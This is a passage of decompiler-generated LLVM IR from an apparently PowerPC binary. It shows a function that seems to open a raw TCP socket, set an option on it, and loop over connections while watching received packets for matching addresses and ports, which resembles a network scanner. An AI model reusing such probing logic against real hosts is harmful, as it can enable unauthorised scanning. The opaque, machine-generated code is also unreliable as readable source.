  uselistorder i1 %v0_10003274, { 1, 0 }
  uselistorder i32 %v1_10003264, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v2_10003240, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10003220, { 1, 0 }
  uselistorder i32 %v0_100031a4, { 2, 1, 0 }
  uselistorder i32 %v4_10003188, { 1, 0, 2 }
  uselistorder i32 %v1_10003184, { 1, 0 }
  uselistorder i32 %v1_100030d4, { 1, 0 }
  uselistorder i32 %v1_1000301c, { 1, 0 }
  uselistorder i32 %v1_10003010, { 1, 0 }
  uselistorder i32 %v1_10002fac, { 1, 0 }
  uselistorder i32 %v0_10002fac, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10002f9c, { 1, 2, 0 }
  uselistorder i32 %v0_10002f90, { 1, 0 }
  uselistorder i32 %v5_10002f3c, { 0, 3, 1, 2 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 8, 9, 21, 22 }
  uselistorder i32* %r31.global-to-local, { 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 1, 2, 3, 4, 16 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 3, 4, 5, 6, 7, 9, 8, 10, 2, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 22, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 1, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3, 4, 8, 5, 6, 7 }
  uselistorder i32* %r21.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 26, 22, 23, 24, 25, 12, 27, 28, 29, 30, 31 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cr3_eq.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i8 47, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder label %dec_label_pc_10003310, { 1, 0 }
  uselistorder label %dec_label_pc_100031e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10003170, { 1, 0 }
  uselistorder label %dec_label_pc_1000316c, { 1, 0 }
  uselistorder label %dec_label_pc_10003150, { 1, 0 }
  uselistorder label %dec_label_pc_100030ec, { 1, 0 }
  uselistorder label %dec_label_pc_100030c0, { 1, 0 }
  uselistorder label %dec_label_pc_10003060, { 1, 0 }
}

define i32 @function_10003320(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10003320:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr3_lt.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i16 @__decompiler_undefined_function_1()
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-404 = alloca i32, align 4
  %stack_var_-384 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %v0_10003324 = load i32, i32* @lr, align 4
  store i32 %v0_10003324, i32* %r0.global-to-local, align 4
  %v0_10003328 = call i32 @__asm_mfcr()
  store i32 %v0_10003328, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r20.global-to-local, align 4
  %v0_10003338 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10003328, i32* %r21.global-to-local, align 4
  %v0_10003370 = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_10003378 = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 268448660, i32* @lr, align 4
  %v2_10003390 = call i32 @function_1000c548(i32 16, i32 16)
  store i32 %v2_10003390, i32* %r22.global-to-local, align 4
  %v0_1000339c = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_1000339c, i32* %r3.global-to-local, align 4
  store i32 268448676, i32* @lr, align 4
  %v2_100033a0 = call i32 @function_1000c548(i32 %v0_1000339c, i32 4)
  %v0_100033a4 = load i32, i32* @r28, align 4
  store i32 %v2_100033a0, i32* %r23.global-to-local, align 4
  %v0_100033b4 = load i32, i32* @r29, align 4
  store i32 %v0_100033b4, i32* %r3.global-to-local, align 4
  store i32 268448700, i32* @lr, align 4
  %v4_100033b8 = inttoptr i32 %v0_100033a4 to i32*
  %v5_100033b8 = call i32 @function_1000235c(i32 %v0_100033b4, i32* %v4_100033b8, i32 2, i32 0)
  %v5_100033c8 = trunc i32 %v5_100033b8 to i8
  %v0_100033d0 = load i32, i32* @r28, align 4
  %v0_100033d4 = load i32, i32* @r29, align 4
  store i32 %v0_100033d4, i32* %r3.global-to-local, align 4
  store i32 268448732, i32* @lr, align 4
  %v4_100033d8 = inttoptr i32 %v0_100033d0 to i32*
  %v5_100033d8 = call i32 @function_1000235c(i32 %v0_100033d4, i32* %v4_100033d8, i32 3, i32 65535)
  %v0_100033dc = load i32, i32* @r28, align 4
  store i32 %v5_100033d8, i32* @r31, align 4
  %v0_100033ec = load i32, i32* @r29, align 4
  store i32 %v0_100033ec, i32* %r3.global-to-local, align 4
  store i32 268448756, i32* @lr, align 4
  %v4_100033f0 = inttoptr i32 %v0_100033dc to i32*
  %v5_100033f0 = call i32 @function_1000235c(i32 %v0_100033ec, i32* %v4_100033f0, i32 4, i32 64)
  %v0_100033f4 = load i32, i32* @r28, align 4
  %v5_10003400 = trunc i32 %v5_100033f0 to i8
  %v0_10003408 = load i32, i32* @r29, align 4
  store i32 %v0_10003408, i32* %r3.global-to-local, align 4
  store i32 268448784, i32* @lr, align 4
  %v4_1000340c = inttoptr i32 %v0_100033f4 to i32*
  %v5_1000340c = call i32 @function_1000235c(i32 %v0_10003408, i32* %v4_1000340c, i32 5, i32 1)
  %v1_10003414 = urem i32 %v5_1000340c, 256
  %v0_10003420 = load i32, i32* @r28, align 4
  %v0_10003428 = load i32, i32* @r29, align 4
  store i32 %v0_10003428, i32* %r3.global-to-local, align 4
  store i32 268448816, i32* @lr, align 4
  %v4_1000342c = inttoptr i32 %v0_10003420 to i32*
  %v5_1000342c = call i32 @function_1000235c(i32 %v0_10003428, i32* %v4_1000342c, i32 7, i32 65535)
  %v0_10003430 = load i32, i32* @r28, align 4
  %v5_1000343c = trunc i32 %v5_1000342c to i16
  %v0_10003444 = load i32, i32* @r29, align 4
  store i32 %v0_10003444, i32* %r3.global-to-local, align 4
  store i32 268448844, i32* @lr, align 4
  %v4_10003448 = inttoptr i32 %v0_10003430 to i32*
  %v5_10003448 = call i32 @function_1000235c(i32 %v0_10003444, i32* %v4_10003448, i32 11, i32 0)
  %v0_1000344c = load i32, i32* @r28, align 4
  %v1_10003450 = urem i32 %v5_10003448, 256
  %v0_10003460 = load i32, i32* @r29, align 4
  store i32 %v0_10003460, i32* %r3.global-to-local, align 4
  store i32 268448872, i32* @lr, align 4
  %v4_10003464 = inttoptr i32 %v0_1000344c to i32*
  %v5_10003464 = call i32 @function_1000235c(i32 %v0_10003460, i32* %v4_10003464, i32 12, i32 1)
  %v0_10003468 = load i32, i32* @r28, align 4
  %v1_10003474 = urem i32 %v5_10003464, 256
  %v0_10003478 = load i32, i32* @r29, align 4
  store i32 %v0_10003478, i32* %r3.global-to-local, align 4
  store i32 268448896, i32* @lr, align 4
  %v4_1000347c = inttoptr i32 %v0_10003468 to i32*
  %v5_1000347c = call i32 @function_1000235c(i32 %v0_10003478, i32* %v4_1000347c, i32 13, i32 1)
  %v0_10003480 = load i32, i32* @r28, align 4
  %v1_1000348c = urem i32 %v5_1000347c, 256
  %v0_10003490 = load i32, i32* @r29, align 4
  store i32 %v0_10003490, i32* %r3.global-to-local, align 4
  store i32 268448920, i32* @lr, align 4
  %v4_10003494 = inttoptr i32 %v0_10003480 to i32*
  %v5_10003494 = call i32 @function_1000235c(i32 %v0_10003490, i32* %v4_10003494, i32 14, i32 0)
  %v0_10003498 = load i32, i32* @r28, align 4
  %v1_100034a4 = urem i32 %v5_10003494, 256
  %v0_100034a8 = load i32, i32* @r29, align 4
  store i32 %v0_100034a8, i32* %r3.global-to-local, align 4
  store i32 268448944, i32* @lr, align 4
  %v4_100034ac = inttoptr i32 %v0_10003498 to i32*
  %v5_100034ac = call i32 @function_1000235c(i32 %v0_100034a8, i32* %v4_100034ac, i32 15, i32 0)
  %v0_100034b0 = load i32, i32* @r28, align 4
  %v1_100034bc = urem i32 %v5_100034ac, 256
  %v0_100034c0 = load i32, i32* @r29, align 4
  store i32 %v0_100034c0, i32* %r3.global-to-local, align 4
  store i32 268448968, i32* @lr, align 4
  %v4_100034c4 = inttoptr i32 %v0_100034b0 to i32*
  %v5_100034c4 = call i32 @function_1000235c(i32 %v0_100034c0, i32* %v4_100034c4, i32 16, i32 0)
  %v0_100034d0 = load i32, i32* @r28, align 4
  %v1_100034d4 = urem i32 %v5_100034c4, 256
  %v0_100034d8 = load i32, i32* @r29, align 4
  store i32 %v0_100034d8, i32* %r3.global-to-local, align 4
  store i32 268448992, i32* @lr, align 4
  %v4_100034dc = inttoptr i32 %v0_100034d0 to i32*
  %v5_100034dc = call i32 @function_1000235c(i32 %v0_100034d8, i32* %v4_100034dc, i32 0, i32 768)
  %v0_100034e0 = load i32, i32* @r28, align 4
  store i32 %v5_100034dc, i32* %r25.global-to-local, align 4
  %v0_100034f0 = load i32, i32* @r29, align 4
  store i32 %v0_100034f0, i32* %r3.global-to-local, align 4
  store i32 268449016, i32* @lr, align 4
  %v4_100034f4 = inttoptr i32 %v0_100034e0 to i32*
  %v5_100034f4 = call i32 @function_1000235c(i32 %v0_100034f0, i32* %v4_100034f4, i32 1, i32 1)
  %v1_100034fc = urem i32 %v5_100034f4, 256
  store i32 %v1_100034fc, i32* %r27.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268449036, i32* @lr, align 4
  %v3_10003508 = call i32 @function_1000c1bc(i32 2, i32 3, i32 6)
  store i32 %v3_10003508, i32* %r3.global-to-local, align 4
  %v3_1000350c = icmp eq i32 %v3_10003508, -1
  store i1 %v3_1000350c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_10003508, i32* %r24.global-to-local, align 4
  br i1 %v3_1000350c, label %dec_label_pc_100036cc, label %dec_label_pc_10003518

dec_label_pc_10003518:                            ; preds = %dec_label_pc_10003320
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10003524 = ptrtoint i32* %stack_var_-408 to i32
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-408, align 4
  store i32 268449076, i32* @lr, align 4
  %v5_10003530 = call i32 @function_1000c180(i32 0, i32 3, i32 %v2_10003524, i32 4, i32 4)
  store i32 %v5_10003530, i32* %r3.global-to-local, align 4
  %v3_10003534 = icmp eq i32 %v5_10003530, -1
  store i1 %v3_10003534, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10003534, label %dec_label_pc_100036c4, label %dec_label_pc_1000353c

dec_label_pc_1000353c:                            ; preds = %dec_label_pc_10003518
  %v0_1000353c = load i32, i32* %r21.global-to-local, align 4
  %v1_1000353c = icmp slt i32 %v0_1000353c, 0
  %v3_1000353c = icmp eq i32 %v0_1000353c, 0
  store i1 %v1_1000353c, i1* %cr3_lt.global-to-local, align 1
  store i1 %v3_1000353c, i1* %cr3_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-408, align 4
  %v0_10003548 = load i32, i32* @r31, align 4
  %v1_10003548 = urem i32 %v0_10003548, 65536
  store i32 %v1_10003548, i32* %r19.global-to-local, align 4
  %tmp49 = icmp slt i32 %v0_1000353c, 1
  br i1 %tmp49, label %dec_label_pc_10003864, label %dec_label_pc_10003550

dec_label_pc_10003550:                            ; preds = %dec_label_pc_1000353c
  %v4_10003550 = sext i16 %v5_1000343c to i32
  store i32 %v4_10003550, i32* %r9.global-to-local, align 4
  store i32 65535, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v2_100035f4 = ptrtoint i32* %stack_var_-368 to i32
  %v2_10003600 = ptrtoint i32* %stack_var_-384 to i32
  %v2_10003604 = ptrtoint i32* %stack_var_-404 to i32
  %v4_1000363c = zext i16 %tmp13 to i32
  %v1_1000366c = and i32 %tmp, 1179648
  %v3_10003780 = icmp eq i32 %v1_10003414, 0
  %v4_100037a0 = sext i8 %v5_100033c8 to i32
  %v4_100037a8 = sext i8 %v5_10003400 to i32
  %v1_10003670 = and i32 %tmp, 327680
  %v3_10003670 = icmp eq i32 %v1_10003670, 0
  %v4_10003678 = icmp eq i32 %v1_1000366c, 1179648
  br label %dec_label_pc_1000355c

dec_label_pc_1000355c:                            ; preds = %dec_label_pc_10003850, %dec_label_pc_10003684, %dec_label_pc_10003550
  %v0_1000355c = load i32, i32* %r25.global-to-local, align 4
  %v1_1000355c = add i32 %v0_1000355c, 40
  store i32 %v1_1000355c, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10003560

dec_label_pc_10003560:                            ; preds = %dec_label_pc_1000365c, %dec_label_pc_1000355c
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268449136, i32* @lr, align 4
  %v3_1000356c = call i32 @function_1000c1bc(i32 2, i32 1, i32 0)
  store i32 %v3_1000356c, i32* %r3.global-to-local, align 4
  %v3_10003570 = icmp eq i32 %v3_1000356c, -1
  store i1 %v3_10003570, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_1000356c, i32* %r28.global-to-local, align 4
  br i1 %v3_10003570, label %dec_label_pc_10003850, label %dec_label_pc_1000357c

dec_label_pc_1000357c:                            ; preds = %dec_label_pc_10003560
  store i32 3, i32* @r4, align 4
  store i32 268449164, i32* @lr, align 4
  %v1_10003588 = call i32 @function_1000b2c0(i32 3)
  store i32 4, i32* @r4, align 4
  %v0_10003594 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10003594, i32* %r3.global-to-local, align 4
  store i32 268449184, i32* @lr, align 4
  %v2_1000359c = call i32 @function_1000b2c0(i32 %v0_10003594)
  store i32 %v2_1000359c, i32* %r3.global-to-local, align 4
  %v3_100035a0 = load i32, i32* %stack_var_-408, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  %v1_100035a8 = mul i32 %v3_100035a0, 24
  store i32 %v1_100035a8, i32* %r0.global-to-local, align 4
  %v0_100035b0 = load i32, i32* %r20.global-to-local, align 4
  %v2_100035b0 = add i32 %v0_100035b0, %v1_100035a8
  store i32 %v2_100035b0, i32* %r11.global-to-local, align 4
  %v1_100035b4 = add i32 %v2_100035b0, 20
  %v2_100035b4 = inttoptr i32 %v1_100035b4 to i8*
  %v3_100035b4 = load i8, i8* %v2_100035b4, align 1
  %v4_100035b4 = zext i8 %v3_100035b4 to i32
  store i32 %v4_100035b4, i32* %r9.global-to-local, align 4
  %v3_100035b8 = icmp eq i8 %v3_100035b4, 31
  store i1 %v3_100035b8, i1* %cr7_eq.global-to-local, align 1
  %tmp50 = icmp ult i8 %v3_100035b4, 32
  %v1_10003690 = add i32 %v2_100035b0, 16
  %v2_10003690 = inttoptr i32 %v1_10003690 to i32*
  %v3_10003690 = load i32, i32* %v2_10003690, align 4
  br i1 %tmp50, label %dec_label_pc_10003690, label %dec_label_pc_100035c0

dec_label_pc_100035c0:                            ; preds = %dec_label_pc_1000357c
  store i32 %v3_10003690, i32* %r0.global-to-local, align 4
  %v0_100035c8 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100035c8, label %dec_label_pc_100036b8, label %dec_label_pc_100035cc

dec_label_pc_100035cc:                            ; preds = %dec_label_pc_10003690, %dec_label_pc_100035c0
  %stack_var_-396.0 = phi i32 [ %v2_100036ac, %dec_label_pc_10003690 ], [ %v3_10003690, %dec_label_pc_100035c0 ]
  store i32 %v4_10003550, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100035d4

dec_label_pc_100035d4:                            ; preds = %dec_label_pc_100036b8, %dec_label_pc_100035cc
  %stack_var_-396.1 = phi i32 [ %stack_var_-396.2, %dec_label_pc_100036b8 ], [ %stack_var_-396.0, %dec_label_pc_100035cc ]
  %storemerge = phi i16 [ %v1_100036b8, %dec_label_pc_100036b8 ], [ %v5_1000343c, %dec_label_pc_100035cc ]
  %v0_100035dc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100035dc, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100035e4.75 to i32), i32* @lr, align 4
  %v0_100035e0 = call i32 @function_1000bfbc()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268449260, i32* @lr, align 4
  %v0_100035e8 = call i32 @function_1000b7c0()
  store i32 %v0_100035e8, i32* %r3.global-to-local, align 4
  store i32 %v0_100035e8, i32* @r31, align 4
  %v4_10003630 = icmp eq i32 %tmp14, %stack_var_-396.1
  %v4_10003640 = zext i16 %storemerge to i32
  %v4_10003644 = icmp eq i16 %storemerge, %tmp13
  %v4_10003630.not = xor i1 %v4_10003630, true
  br label %dec_label_pc_100035f0

dec_label_pc_100035f0:                            ; preds = %dec_label_pc_1000364c, %dec_label_pc_100035d4
  store i32 16, i32* %r0.global-to-local, align 4
  store i32 %v2_10003600, i32* %r7.global-to-local, align 4
  store i32 %v2_10003604, i32* %r8.global-to-local, align 4
  %v0_10003608 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10003608, i32* %r3.global-to-local, align 4
  store i32 16, i32* %stack_var_-404, align 4
  store i32 268449300, i32* @lr, align 4
  %v6_10003610 = call i32 @function_1000c0c8(i32 %v0_10003608, i32 %v2_100035f4, i32 256, i32 16384, i32 %v2_10003600, i32 %v2_10003604)
  store i32 %v6_10003610, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_1000361c = icmp eq i32 %v6_10003610, -1
  store i1 %v3_1000361c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000361c, label %dec_label_pc_100036cc, label %dec_label_pc_10003628

dec_label_pc_10003628:                            ; preds = %dec_label_pc_100035f0
  store i32 %tmp14, i32* %r10.global-to-local, align 4
  store i32 %stack_var_-396.1, i32* %r0.global-to-local, align 4
  store i1 %v4_10003630, i1* %cr7_eq.global-to-local, align 1
  %tmp51 = icmp ult i32 %v6_10003610, 41
  %or.cond = or i1 %tmp51, %v4_10003630.not
  br i1 %or.cond, label %dec_label_pc_1000364c, label %dec_label_pc_1000363c

dec_label_pc_1000363c:                            ; preds = %dec_label_pc_10003628
  store i32 %v4_1000363c, i32* %r0.global-to-local, align 4
  store i32 %v4_10003640, i32* %r8.global-to-local, align 4
  store i1 %v4_10003644, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10003644, label %dec_label_pc_10003668, label %dec_label_pc_1000364c

dec_label_pc_1000364c:                            ; preds = %dec_label_pc_10003628, %dec_label_pc_10003680, %dec_label_pc_1000363c
  store i32 268449360, i32* @lr, align 4
  %v0_1000364c = call i32 @function_1000b7c0()
  %v0_10003650 = load i32, i32* @r31, align 4
  %v2_10003650 = sub i32 %v0_1000364c, %v0_10003650
  store i32 %v2_10003650, i32* %r3.global-to-local, align 4
  %v3_10003654 = icmp eq i32 %v2_10003650, 10
  store i1 %v3_10003654, i1* %cr7_eq.global-to-local, align 1
  %tmp52 = icmp slt i32 %v2_10003650, 11
  br i1 %tmp52, label %dec_label_pc_100035f0, label %dec_label_pc_1000365c

dec_label_pc_1000365c:                            ; preds = %dec_label_pc_1000364c
  %v0_1000365c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000365c, i32* %r3.global-to-local, align 4
  store i32 268449380, i32* @lr, align 4
  %v0_10003660 = call i32 @function_1000b3f0()
  store i32 %v0_10003660, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003560

dec_label_pc_10003668:                            ; preds = %dec_label_pc_1000363c
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i32 %v1_1000366c, i32* %r11.global-to-local, align 4
  store i32 1179648, i32* %r0.global-to-local, align 4
  store i1 %v4_10003678, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10003678, label %dec_label_pc_1000372c, label %dec_label_pc_10003680

dec_label_pc_10003680:                            ; preds = %dec_label_pc_10003668
  br i1 %v3_10003670, label %dec_label_pc_1000364c, label %dec_label_pc_10003684

dec_label_pc_10003684:                            ; preds = %dec_label_pc_10003680
  %v0_10003684 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10003684, i32* %r3.global-to-local, align 4
  store i32 268449420, i32* @lr, align 4
  %v0_10003688 = call i32 @function_1000b3f0()
  store i32 %v0_10003688, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000355c

dec_label_pc_10003690:                            ; preds = %dec_label_pc_1000357c
  store i32 %v3_10003690, i32* %r29.global-to-local, align 4
  %v0_10003694 = call i32 @function_10007ca8()
  store i32 %v0_10003694, i32* %r3.global-to-local, align 4
  %v3_10003698 = load i32, i32* %stack_var_-408, align 4
  %v1_1000369c = mul i32 %v3_10003698, 24
  %v1_100036a0 = load i32, i32* %r20.global-to-local, align 4
  %v2_100036a0 = add i32 %v1_100036a0, %v1_1000369c
  store i32 %v2_100036a0, i32* %r9.global-to-local, align 4
  %v1_100036a4 = add i32 %v2_100036a0, 20
  %v2_100036a4 = inttoptr i32 %v1_100036a4 to i8*
  %v3_100036a4 = load i8, i8* %v2_100036a4, align 1
  %v4_100036a4 = zext i8 %v3_100036a4 to i32
  store i32 %v4_100036a4, i32* %r0.global-to-local, align 4
  %tmp53 = urem i8 %v3_100036a4, 64
  %v2_100036a8 = zext i8 %tmp53 to i32
  %v3_100036a8 = lshr i32 %v0_10003694, %v2_100036a8
  store i32 %v3_100036a8, i32* %r3.global-to-local, align 4
  %v0_100036ac = load i32, i32* %r29.global-to-local, align 4
  %v2_100036ac = add i32 %v3_100036a8, %v0_100036ac
  store i32 %v2_100036ac, i32* %r29.global-to-local, align 4
  %v0_100036b4 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100036b4, label %dec_label_pc_100036b8, label %dec_label_pc_100035cc

dec_label_pc_100036b8:                            ; preds = %dec_label_pc_10003690, %dec_label_pc_100035c0
  %stack_var_-396.2 = phi i32 [ %v2_100036ac, %dec_label_pc_10003690 ], [ %v3_10003690, %dec_label_pc_100035c0 ]
  %v0_100036b8 = call i32 @function_10007ca8()
  %v1_100036b8 = trunc i32 %v0_100036b8 to i16
  store i32 %v0_100036b8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100035d4

dec_label_pc_100036c4:                            ; preds = %dec_label_pc_10003518
  %v0_100036c4 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_100036c4, i32* %r3.global-to-local, align 4
  store i32 268449484, i32* @lr, align 4
  %v0_100036c8 = call i32 @function_1000b3f0()
  store i32 %v0_100036c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100036cc

dec_label_pc_100036cc:                            ; preds = %dec_label_pc_100035f0, %dec_label_pc_10003320, %dec_label_pc_100036c4
  store i32 %v0_10003338, i32* %r0.global-to-local, align 4
  %v1_100036e0 = call %0 @__asm_mtcrf(i32 56, i32 %v0_10003328)
  store i32 %v0_10003370, i32* %r28.global-to-local, align 4
  store i32 %v0_10003378, i32* %r29.global-to-local, align 4
  %v0_10003728 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10003728

dec_label_pc_1000372c:                            ; preds = %dec_label_pc_10003668
  %v3_1000372c = load i32, i32* %stack_var_-408, align 4
  store i32 %v3_1000372c, i32* %r29.global-to-local, align 4
  %v0_10003730 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_10003730, i32* @r3, align 4
  %v0_10003734 = load i32, i32* @r30, align 4
  %v1_10003734 = add i32 %v0_10003734, 2
  %v2_10003734 = inttoptr i32 %v1_10003734 to i16*
  %v3_10003734 = load i16, i16* %v2_10003734, align 2
  %v4_10003734 = zext i16 %v3_10003734 to i32
  store i32 %v4_10003734, i32* %r11.global-to-local, align 4
  %v1_10003738 = mul i32 %v3_1000372c, 16
  store i32 %v1_10003738, i32* %r9.global-to-local, align 4
  %v1_1000373c = mul i32 %v3_1000372c, 4
  store i32 %v1_1000373c, i32* @r29, align 4
  %v1_10003740 = load i32, i32* %r22.global-to-local, align 4
  %v3_10003740 = add i32 %v1_10003740, %v1_10003738
  %v4_10003740 = inttoptr i32 %v3_10003740 to i32*
  store i32 %tmp14, i32* %v4_10003740, align 4
  %v0_10003744 = load i32, i32* %r22.global-to-local, align 4
  %v1_10003744 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003744 = add i32 %v1_10003744, %v0_10003744
  store i32 %v2_10003744, i32* %r9.global-to-local, align 4
  %v0_10003748 = load i32, i32* %r8.global-to-local, align 4
  %v1_10003748 = trunc i32 %v0_10003748 to i16
  %v3_10003748 = add i32 %v2_10003744, 14
  %v4_10003748 = inttoptr i32 %v3_10003748 to i16*
  store i16 %v1_10003748, i16* %v4_10003748, align 2
  %v0_1000374c = load i32, i32* @r30, align 4
  %v1_1000374c = add i32 %v0_1000374c, 4
  %v2_1000374c = inttoptr i32 %v1_1000374c to i32*
  %v3_1000374c = load i32, i32* %v2_1000374c, align 4
  store i32 %v3_1000374c, i32* %r0.global-to-local, align 4
  %v0_10003750 = load i32, i32* %r11.global-to-local, align 4
  %v1_10003750 = trunc i32 %v0_10003750 to i16
  %v2_10003750 = load i32, i32* %r9.global-to-local, align 4
  %v3_10003750 = add i32 %v2_10003750, 12
  %v4_10003750 = inttoptr i32 %v3_10003750 to i16*
  store i16 %v1_10003750, i16* %v4_10003750, align 2
  %v0_10003754 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003754 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003754 = add i32 %v1_10003754, 4
  %v3_10003754 = inttoptr i32 %v2_10003754 to i32*
  store i32 %v0_10003754, i32* %v3_10003754, align 4
  %v0_10003758 = load i32, i32* @r30, align 4
  %v1_10003758 = add i32 %v0_10003758, 8
  %v2_10003758 = inttoptr i32 %v1_10003758 to i32*
  %v3_10003758 = load i32, i32* %v2_10003758, align 4
  store i32 %v3_10003758, i32* %r0.global-to-local, align 4
  %v1_1000375c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000375c = add i32 %v1_1000375c, 8
  %v3_1000375c = inttoptr i32 %v2_1000375c to i32*
  store i32 %v3_10003758, i32* %v3_1000375c, align 4
  store i32 268449636, i32* @lr, align 4
  %v0_10003760 = call i32 @function_1000c3f0()
  store i32 %v0_10003760, i32* %r3.global-to-local, align 4
  %v3_10003764 = load i32, i32* %stack_var_-408, align 4
  store i32 %v3_10003764, i32* %r0.global-to-local, align 4
  %v1_10003768 = load i32, i32* @r29, align 4
  %v2_10003768 = load i32, i32* %r23.global-to-local, align 4
  %v3_10003768 = add i32 %v2_10003768, %v1_10003768
  %v4_10003768 = inttoptr i32 %v3_10003768 to i32*
  store i32 %v0_10003760, i32* %v4_10003768, align 4
  %v0_1000376c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000376c = mul i32 %v0_1000376c, 4
  store i32 %v1_1000376c, i32* %r0.global-to-local, align 4
  %v0_10003770 = load i32, i32* %r23.global-to-local, align 4
  %v2_10003770 = add i32 %v0_10003770, %v1_1000376c
  %v3_10003770 = inttoptr i32 %v2_10003770 to i32*
  %v4_10003770 = load i32, i32* %v3_10003770, align 4
  store i32 %v4_10003770, i32* @r31, align 4
  store i32 %v1_10003414, i32* %r0.global-to-local, align 4
  %v1_10003778 = inttoptr i32 %v4_10003770 to i32*
  %v2_10003778 = load i32, i32* %v1_10003778, align 4
  store i32 %v2_10003778, i32* %r9.global-to-local, align 4
  %v1_1000377c = add i32 %v4_10003770, 20
  store i32 %v1_1000377c, i32* @r30, align 4
  store i1 %v3_10003780, i1* %cr7_eq.global-to-local, align 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10003788 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10003788, i32* %r9.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_10003790 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v0_10003794 = load i32, i32* %r19.global-to-local, align 4
  %v1_10003794 = trunc i32 %v0_10003794 to i16
  %v2_10003794 = load i32, i32* @r31, align 4
